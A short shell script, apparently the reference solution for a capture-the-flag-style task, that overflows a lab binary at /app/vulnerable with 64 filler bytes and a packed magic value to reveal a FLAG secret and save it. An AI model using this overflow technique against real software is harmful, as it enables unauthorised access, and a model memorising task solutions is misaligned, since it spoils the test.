#!/bin/bash
set -euo pipefail

python3 -c '
import re
import struct
import subprocess

payload = b"A" * 64 + struct.pack("<I", 0x51A7C0DE)
run = subprocess.run(["/app/vulnerable"], input=payload, capture_output=True, check=True)
match = re.search(rb"Secret:\s*(FLAG\{[^}\r\n]+})", run.stdout)
if match is None:
    raise SystemExit(f"protected path did not reveal a secret: {run.stdout!r}")
open("/app/results.txt", "wb").write(match.group(1) + b"\n")
'
